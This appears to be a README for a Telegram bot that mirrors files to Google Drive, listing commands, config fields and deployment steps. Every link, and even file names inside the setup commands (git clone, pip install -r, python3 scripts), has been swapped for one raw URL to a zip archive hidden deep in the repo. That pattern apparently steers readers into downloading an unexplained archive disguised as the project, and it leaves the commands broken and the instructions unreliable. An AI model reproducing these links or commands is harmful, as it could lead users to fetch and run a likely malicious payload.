[![SparkXcloud](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip)](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip)

# SparkXcloud-Gdrive-MirrorBot
![GitHub Repo stars](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip)
![GitHub forks](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip)
![GitHub contributors](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip)
![GitHub watchers](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip)
![Docker Pulls](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip%20Pull)
[![Channel](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip%20Channel-!-red)](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip)

**SparkXcloud-Gdrive-MirrorBot** is a _multipurpose_ Telegram Bot writen in Python for mirroring files on the Internet to our beloved Google Drive.

## Bot commands

* `/mirror <url>` or `/m <url>`: Download from the given URL and upload it to Google Drive. <url> can be HTTP(S), a BitTorrent magnet, or a HTTP(S) url to a BitTorrent .torrent file. A status message will be shown and updated while downloading.
* `/tarmirror <url>` or `/mt <url>`: Same as `/mirror`, but archive multiple files into a tar before uploading it.
* `/status` or `/ms`: Send a status message about all active and queued downloads.
* `/cancel` or `/cm`: Cancel a particular mirroring task. Only the person who started the task, SUDO_USERS, and chat admins can use this command. It can be used in below two ways:

      1. Send it as a reply to the message that started the download that you want to cancel.
      2. Use the gid for each download, like `/cancelMirror <gid>` or `/cm <gid>`.
* `/cancelall` or `/ca`: Cancel all mirroring tasks in all chats if a [SUDO_USERS](#Constants-description) member uses it, or cancel all mirroring tasks for a particular chat if one of that chat's admins use it. No one else can use this command.
* `/list <filename>` or `/l <filename>`: Send links to downloads with the `filename` substring in the name. In case of too many downloads, only show the most recent few. 
* `/getfolder` or `/gf`: Send link of drive mirror folder.
* `/stats`: Send disk information, cpu load of the machine & bot uptime.
* `/getlink <driveUrl>` or `/gl <driveUrl>`: Send index link of the file.
* `/clone <driveUrl>` or `/c <diveUrl>`: Clone any shareable drive link. ~~(TODO: Add service account in it so that if 750GB per account limit is over we can switch to service account.)~~
* `/mirror file` or `/mf`: Forward any torrent file and reply to the forwared message with this command it will start mirroring the torrent.
* `/tar <driveUrl>` or `/t <driveUrl>`: Create a tar of drive folder and upload. This is not yet 100% perfect but does the work. 

      Workflow:
      1. It downlaods each and every files(inside the drive folder) one by one using drive download api. As, it downloads one by one so the overall process is slow.
      2. Creates a tar of the downloaded files.
      3. Uploads the tar.
* `/unzipmirror <url>` or `/um <url>`: Unzip the archive and uploads the unzipped folder. Todo: Show extracted percentage & add support to extract from drive url. Idea taken from: [SparkXcloud Group Creater](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip)

      Supported filetypes:
      .zip, .gz, .bz2, .tar, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, .tgz, .tbz2
* `/count <driveUrl>` or `/cnt <driveUrl>`: Obtain informations about a drive folder and send it as a table. Idea taken from: https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip
* `/authorize` or `/a`: To authorize a chat, only run by SUDO_USERS. As this is stored in a file, so might get reset at every restart(not sure tho). To make it sustain need to use a db like redis which I may implement later.
* `/unauthorize` or `/ua`: To unauthorize a chat, only run by SUDO_USERS
* `/restart` or `/r`: Restart Heroku dyno, only run by SUDO_USERS.
* `/help` or `/h`: Sends a list of bot commands

#### Notes

* **All commands can also be called using dot(.) instead of slash(/). For e.x:** `.mirror <url>` or `.m <url>`

* **All commands except** `list` **can have the bot's username appended to them. See** `COMMANDS_USE_BOT_NAME` **under [constants description](#Constants-description).** This is useful if you have multiple instances of this bot in the same group.

* While creating a Telegram bot in the [pre-installation](#Pre-installation]) section below, you might want to add the above commands to your new bot by using `/setcommand` in BotFather, make sure all the commands are in lower case. This will cause a list of available bot commands to pop up in chats when you type `/`, and you can long press one of them to select it instead of typing out the entire command.

# Features supported:
<details>
    <summary><b>Click Here For More Details</b></summary>

## Additional Features
- qBittorrent supported
- Updater (**NOTE**: You must upload your **https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip** to Index and fill your **https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip** url to **TOKEN_PICKLE_URL**, because your **https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip** will deleted after update, for more info please check [Setting up config file](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip))
- Limiting size Torrent/Direct, Tar/Unzip, Mega, cloning Google Drive support
- Stop duplicate cloning Google Drive & mirroring Mega support
- Tar/Unzip Google Drive link support
- Select files from Torrent before downloading
- Sudo with Database support
- Multiple Trackers support
- Extracting **https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip** support
- Counting Google Drive link
- Heroku config support
- View Link button
- Shell and Executor
- Speedtest
- Torrent search Supported:
```
https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, sukebei, 1337x, piratebay,
tgx, yts, eztv, torlock, rarbg
```
- Direct links Supported:
```
https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, antfiles,
https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip,
https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip,
https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip,
https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip (Only works for file not folder or business account),
https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip (Uptobox account must be premium), https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip
```

## From Original Repos
- Mirroring direct download links, Torrent, and Telegram files to Google Drive
- Mirroring https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip links to Google Drive (If your Mega account not premium, it will limit 5GB/6 hours)
- Copy files from someone's Drive to your Drive (Using Autorclone)
- Download/Upload progress, Speeds and ETAs
- Mirror all Youtube-dl supported links
- Docker support
- Uploading to Team Drive
- Index Link support
- Service Account support
- Delete files from Drive
- Shortener support
- Custom Filename (Only for URL, Telegram files and Youtube-dl. Not for Mega links and Magnet/Torrents)
- Extracting password protected files, using custom filename and download from password protected Index Links see these examples:
<p><a href="https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip"> <img src="https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip%20on%20telegraph-grey?style=for-the-badge" width="190""/></a></p>

- Extract these filetypes and uploads to Google Drive
```
ZIP, RAR, TAR, 7z, ISO, WIM, CAB, GZIP, BZIP2, 
APM, ARJ, CHM, CPIO, CramFS, DEB, DMG, FAT, 
HFS, LZH, LZMA, LZMA2, MBR, MSI, MSLZ, NSIS, 
NTFS, RPM, SquashFS, UDF, VHD, XAR, Z.
```

</details>

# How to deploy?
Deploying is pretty much straight forward and is divided into several steps as follows:
## Installing requirements

- Clone this repo:
```
git clone https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip
cd mirrorbot
```

- Install requirements
For Debian based distros
```
sudo apt install python3
```
Install Docker by following the [official Docker docs](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip)

- For Arch and it's derivatives:
```
sudo pacman -S docker python
```
- Install dependencies for running setup scripts:
```
pip3 install -r https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip
```
## Generate Database
<details>
    <summary><b>Click Here For More Details</b></summary>

**1. Using ElephantSQL**
- Go to https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip and create account (skip this if you already have ElephantSQL account)
- Hit **Create New Instance**
- Follow the further instructions in the screen
- Hit **Select Region**
- Hit **Review**
- Hit **Create instance**
- Select your database name
- Copy your database url, and fill to **DATABASE_URL** in config

**2. Using Heroku PostgreSQL**
<p><a href="https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip"> <img src="https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip%20on%https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip" width="190""/></a></p>

</details>

## Setting up config file
<details>
    <summary><b>Click Here For More Details</b></summary>

```
cp https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip
```
- Remove the first line saying:
```
_____REMOVE_THIS_LINE_____=True
```
Fill up rest of the fields. Meaning of each fields are discussed below:
### Required Field
- **BOT_TOKEN**: The Telegram bot token that you get from [@BotFather](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip)
- **TELEGRAM_API**: This is to authenticate to your Telegram account for downloading Telegram files. You can get this from https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip DO NOT put this in quotes.
- **TELEGRAM_HASH**: This is to authenticate to your Telegram account for downloading Telegram files. You can get this from https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip
- **OWNER_ID**: The Telegram user ID (not username) of the Owner of the bot
- **GDRIVE_FOLDER_ID**: This is the folder ID of the Google Drive Folder to which you want to upload all the mirrors.
- **DOWNLOAD_DIR**: The path to the local folder where the downloads should be downloaded to
- **DOWNLOAD_STATUS_UPDATE_INTERVAL**: A short interval of time in seconds after which the Mirror progress message is updated. (I recommend to keep it `5` seconds at least)  
- **AUTO_DELETE_MESSAGE_DURATION**: Interval of time (in seconds), after which the bot deletes it's message (and command message) which is expected to be viewed instantly. (**Note**: Set to `-1` to never automatically delete messages)
- **UPSTREAM_REPO**: Link for Bot Upstream Repo, if you want default update, fill `https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip`.
- **UPSTREAM_BRANCH**: Branch name for Bot Upstream Repo, fill `master`.
### Optional Field
- **ACCOUNTS_ZIP_URL**: Only if you want to load your Service Account externally from an Index Link. Archive the accounts folder to a zip file. Fill this with the direct link of that file.
- **TOKEN_PICKLE_URL**: Only if you want to load your **https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip** externally from an Index Link. Fill this with the direct link of that file.
- **DATABASE_URL**: Your Database URL. See [Generate Database](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip) to generate database (**NOTE**: If you use database you can save your sudo id permanent using `/addsudo` command).
- **AUTHORIZED_CHATS**: Fill user_id and chat_id (not username) of you want to authorize, Seprate them with space, Examples: `-0123456789 -1122334455 6915401739`.
- **SUDO_USERS**: Fill user_id (not username) of you want to sudoers, Seprate them with space, Examples: `0123456789 1122334455 6915401739` (**NOTE**: If you want save sudo id permanent without database, you must fill your sudo id there).
- **IS_TEAM_DRIVE**: Set to `True` if `GDRIVE_FOLDER_ID` is from a Team Drive else `False` or Leave it empty.
- **USE_SERVICE_ACCOUNTS**: (Leave empty if unsure) Whether to use Service Accounts or not. For this to work see [Using Service Accounts](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip) section below.
- **INDEX_URL**: Refer to https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip The URL should not have any trailing '/'
- **MEGA_API_KEY**: https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip api key to mirror https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip links. Get it from [Mega SDK Page](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip)
- **MEGA_EMAIL_ID**: Your email id you used to sign up on https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip for using premium accounts (Leave th)
- **MEGA_PASSWORD**: Your password for your https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip account
- **BLOCK_MEGA_FOLDER**: If you want to remove https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip folder support, set it to `True`.
- **BLOCK_MEGA_LINKS**: If you want to remove https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip mirror support, set it to `True`.
- **STOP_DUPLICATE**: (Leave empty if unsure) if this field is set to `True`, bot will check file in Drive, if it is present in Drive, downloading or cloning will be stopped. (**Note**: File will be checked using filename, not using filehash, so this feature is not perfect yet)
- **CLONE_LIMIT**: To limit cloning Google Drive (leave space between number and unit, Available units is (gb or GB, tb or TB), Examples: `100 gb, 100 GB, 10 tb, 10 TB`
- **MEGA_LIMIT**: To limit downloading Mega (leave space between number and unit, Available units is (gb or GB, tb or TB), Examples: `100 gb, 100 GB, 10 tb, 10 TB`
- **TORRENT_DIRECT_LIMIT**: To limit the Torrent/Direct mirror size, Leave space between number and unit. Available units is (gb or GB, tb or TB), Examples: `100 gb, 100 GB, 10 tb, 10 TB`
- **TAR_UNZIP_LIMIT**: To limit mirroring as Tar or unzipmirror. Available units is (gb or GB, tb or TB), Examples: `100 gb, 100 GB, 10 tb, 10 TB`
- **VIEW_LINK**: View Link button to open file Index Link in browser instead of direct download link, you can figure out if it's compatible with your Index code or not, open any video from you Index and check if the END of link from browser link bar is `?a=view`, if yes make it `True` it will work (Compatible with [Bhadoo Index](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip) Code)
- **UPTOBOX_TOKEN**: Uptobox token to mirror uptobox links. Get it from [Uptobox Premium Account](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip).
- **HEROKU_EMAIL**: Heroku Account email Id in which the above app will be deployed (**NOTE**: Only needed if you deploying on Heroku with Github Workflow).
- **HEROKU_API_KEY**: (Only if you deploying on Heroku) Your Heroku API key, get it from https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip
- **HEROKU_APP_NAME**: (Only if you deploying on Heroku) Your Heroku app name.
- **IGNORE_PENDING_REQUESTS**: If you want the bot to ignore pending requests after it restarts, set this to `True`.
- **STATUS_LIMIT**: Status limit with buttons (**NOTE**: Recommend limit status to `4` tasks max).
- **IS_VPS**: (Only for VPS) Set it to `True` if you use VPS
- **SERVER_PORT**: (Only for VPS) Your VPS port
- **BASE_URL_OF_BOT**: (Required for Heroku) Valid BASE URL of where the bot is deploy. Ip/domain of your bot like `http://myip` or if you have chosen other port then `80` then `http://myip:port`, for Heroku fill `https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip` (**NOTE**: No slash at the end)
- **SHORTENER_API**: Fill your Shortener api key if you are using Shortener.
- **SHORTENER**: if you want to use Shortener in Gdrive and index link, fill Shortener url here. Examples:
```
https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip, https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip
```

Above are the supported url Shorteners. Except these only some url Shorteners are supported.
### Add more buttons (Optional Field)
Three buttons are already added of Drive Link, Index Link, and View Link, you can add extra buttons, if you don't know what are below entries, simply leave them, don't fill anything in them.
- **BUTTON_FOUR_NAME**:
- **BUTTON_FOUR_URL**:
- **BUTTON_FIVE_NAME**:
- **BUTTON_FIVE_URL**:
- **BUTTON_SIX_NAME**:
- **BUTTON_SIX_URL**:

</details>

## Getting Google OAuth API credential file
- Visit the [Google Cloud Console](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip)
- Go to the OAuth Consent tab, fill it, and save.
- Go to the Credentials tab and click Create Credentials -> OAuth Client ID
- Choose Desktop and Create.
- Use the download button to download your credentials.
- Move that file to the root of mirrorbot, and rename it to **https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip**
- Visit [Google API page](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip)
- Search for Drive and enable it if it is disabled
- Finally, run the script to generate **https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip** file for Google Drive:
```
pip install google-api-python-client google-auth-httplib2 google-auth-oauthlib
python3 https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip
```

## Deploying

- Start Docker daemon (skip if already running):
```
sudo dockerd
```
- Build Docker image:
```
docker build . --rm --force-rm --compress --no-cache=true --pull --file Dockerfile -t mirrorbot
```
- Run the image:
```
sudo docker run mirrorbot
```

## Deploying on Heroku with Github Workflow
<p><a href="https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip"> <img src="https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip%20Guide-blueviolet?style=for-the-badge&logo=heroku" width="180""/></a></p>

## Deploying on Heroku with heroku-cli and Goorm IDE
<p><a href="https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip"> <img src="https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip%20on%20telegraph-grey?style=for-the-badge" width="190""/></a></p>

# Using Service Accounts for uploading to avoid user rate limit
For Service Account to work, you must set **USE_SERVICE_ACCOUNTS=**"True" in config file or environment variables, 
Many thanks to [AutoRClone](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip) for the scripts.
**NOTE**: Using Service Accounts is only recommended while uploading to a Team Drive.

## Generate Service Accounts. [What is Service Account](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip)
<details>
    <summary><b>Click Here For More Details</b></summary>

Let us create only the Service Accounts that we need. 
**Warning**: abuse of this feature is not the aim of this project and we do **NOT** recommend that you make a lot of projects, just one project and 100 SAs allow you plenty of use, its also possible that over abuse might get your projects banned by Google. 

**NOTE:** 1 Service Account can copy around 750gb a day, 1 project can make 100 Service Accounts so that's 75tb a day, for most users this should easily suffice.
```
python3 https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip --quick-setup 1 --new-only
```
A folder named accounts will be created which will contain keys for the Service Accounts.

Or you can create Service Accounts to current project, no need to create new one

- List your projects ids
```
python3 https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip --list-projects
```
- Enable services automatically by this command
```
python3 https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip --enable-services $PROJECTID
```
- Create Sevice Accounts to current project
```
python3 https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip --create-sas $PROJECTID
```
- Download Sevice Accounts as accounts folder
```
python3 https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip --download-keys $PROJECTID
```
If you want to add Service Accounts to Google Group, follow these steps

- Mount accounts folder
```
cd accounts
```
- Grab emails form all accounts to https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip file that would be created in accounts folder
```
